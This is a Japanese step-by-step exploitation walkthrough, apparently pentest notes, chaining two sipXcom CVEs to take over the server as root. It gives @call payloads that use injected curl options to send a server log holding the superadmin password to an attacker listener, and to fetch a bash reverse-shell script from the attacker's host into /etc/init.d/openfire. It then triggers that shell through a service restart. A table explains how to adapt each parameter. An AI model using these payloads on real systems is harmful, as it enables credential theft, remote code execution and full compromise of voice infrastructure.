## SipXcom RCE・PE（CVE-2023-25355・CVE-2023-25356）

### 1. 概要

*sipXcom* というVoIPに存在するコマンドインジェクション脆弱性 (CVE-2023-25355) および不適切なファイルパーミッション (CVE-2023-25356) を組み合わせることで、特権昇格および root 権限の奪取が可能である。

エクスプロイトには、XMPP の脆弱性を使うため、*pidgin*という、複数のチャットネットワーク（XMPP、IRC、旧MSN、Yahoo!など）に同時にログインして管理できるオープンソースのマルチプロトコル・インスタントメッセンジャー（IM）クライアント を使う。

sipXcom は内部NWで動作していることが多く、ここでは、*Squid* を使って内部NWの sipXcom にアクセスしていることとする。

- CVE:
	- [CVE-2023-25355](https://nvd.nist.gov/vuln/detail/CVE-2023-25355)：`@call` コマンドが内部で `curl` を実行する際、引数を適切に制限していないため、攻撃者が任意の `curl` オプション (`-o`, `-d`, `-X` 等) を注入できる
	- [CVE-2023-25356](https://nvd.nist.gov/vuln/detail/CVE-2023-25356)：`/etc/init.d/openfire` 等の重要な起動スクリプトに不適切な書き込み権限があり、改ざんしたスクリプトが root 権限で再実行されることにより特権昇格が可能となる
- 影響バージョン：21.04 以前
- PoC：[CoreDial sipXcom sipXopenfire 21.04 Remote Command Execution / Weak Permissions - Packet Storm]( https://packetstorm.news/files/id/171281)

### 2. 攻略手順

#### ステップ 1: 環境準備と時刻同期

1. ターゲットの SSL 証明書エラーを回避するため、HTTP ヘッダーからサーバー時刻を取得し、自身の端末 (Kali) と同期させる
```bash
curl -I -x http://<squidIP>:<port> -U '<squid_username>:<squid_password>' http://<内部NW_IP>

# 取得した GMT 時刻を Kali に設定
sudo date -s "<Date_value>"
````

2. pidgin をインストールする
```sh
sudo apt install pidgin
```

3. sipXcomは内部NWで動作していることが多いので、Proxychains4.confを設定
```sh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
http <squid_IP> 3128 <username> <password>
```

4. Proxychainsで pidgin を起動
```sh
proxychains pidgin
```

5. Pidgin に入手済みの認証情報などの設定情報を入力する
	- Basic
		- Protocol: XMPP
		- Username: sipXcomのユーザー名
		- Domain: ターゲットドメイン
		- Resource: ターゲットIPアドレス
	- Advanced
		- Connection security: Use encryption if available
		- Connect port: 5222
		- Connect server: ターゲットIPアドレス
	- Proxy
		- Proxy type: HTTP
		- Host: squidのIPアドレス
		- Port: squidの動作ポート
		- Username: squidのユーザー名
		- Password: squidのパスワード

>[!NOTE]
"Accept certificate for..." というポップアップが表示されたらAcceptすること

#### ステップ 2: 資格情報の奪取 (CVE-2023-25355)

チャット経由で任意ファイル読み取りコマンドを送信し、sipXcom の`superadmin` のパスワードをログから特定する。

1. Pidgin の Buddies  > New Instant Message で、Name に sipXcomでログインしたユーザー以外の sipXcomユーザー名を入力（チャット相手を指定）

2. Kali 側でログを受け取るリスナーを立てる
```sh
sudo nc -lvnp 80 > sipx_log.txt
```

3. Pidgin でsipxopenfire-im.log を要求させる
```
@call abc -o /tmp/dummy -d @/opt/openfire/logs/sipxopenfire-im.log <AttackerIP>/abc
```

#### ステップ 3: ペイロードのデリバリーと権限付与

悪意のある起動スクリプトを作成し、ターゲット上の正規のサービスファイルを上書きする。

1. リバースシェルペイロード (openfire.init) の作成:
```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<AttackerIP>/443 0>&1' > openfire.init
```

2. ペイロードデリバリー用にHTTPサーバーの起動
```sh
sudo python -m http.server 80
```

3. Pidgin で上書きコマンドを送信
```sh
# 他のファイルをダウンロードさせたいとき：@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://<AttackerIP>/openfire.init -o /tmp/dummy
@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://<AttackerIP>/openfire.init -o /tmp/dummy
```
- 管理者が「このURLにあるプラグインを入れて」と指示すると、Openfire（Java実行環境）が自ら HTTP リクエストを飛ばしてファイルを落としてくる機能があるため、これでファイルがダウンロードされてしまう

4. 実行権限の付与
```sh
@call abc -o /tmp/dummy -c "chmod 755 /etc/init.d/openfire" -o /tmp/dummy
```


| **値（パラメータ）**                   | **役割と意味**                                                     | **変更すべきか？**                                                  |
| ------------------------------ | ------------------------------------------------------------- | ------------------------------------------------------------ |
| **`-o /tmp/dummy`**            | 出力先（output）の指定です。1つ目は書き込み確認やログの撹乱に使われます。                      | 変更不要ですが、書き込み権限がある場所ならどこでもOKです。                               |
| **`-o /etc/init.d/openfire`**  | **【最重要】本命の保存先です。** ここにファイルを置くことで、OS起動時に自動実行（永続化）を狙っています。      | **任意に変更可能。** 実行権限を持たせたいなら `/etc/init.d/`、単なる配置なら `/tmp/` など。 |
| **`-X GET`**                   | HTTPメソッドの指定です。外部サーバーからファイルを取得するために `GET` を使います。               | 通常は `GET` のままで問題ありません。                                       |
| **`http://.../openfire.init`** | **【重要】取得元URLです。** 攻撃者のサーバーにある、送り込みたいファイルへのパスです。               | **自分の環境に合わせて必ず変更**してください。                                    |
| **`-o /tmp/dummy`**            | 3つ目の出力先です。コマンドの最後を閉じるためのノイズとして機能しています。                        | そのままで構いません。                                                  |


#### ステップ 4: 特権昇格の実行 (CVE-2023-25356)

Web 管理画面 に `superadmin` でログインし、サービスの再起動をトリガーにシェルを発火させる。

1. リスナーの待機
```sh
sudo penelope -p 443
```

2. Web UI に`superadmin`でログイン > SYSTEM -  SERVERSをクリック > SERVERS AND ROLES 画面で、Name列のリンクをクリック > SERVER 画面で左ペインから Services を選択し、⚙IM - XMPP (openfire) にチェックのうえ、Restart
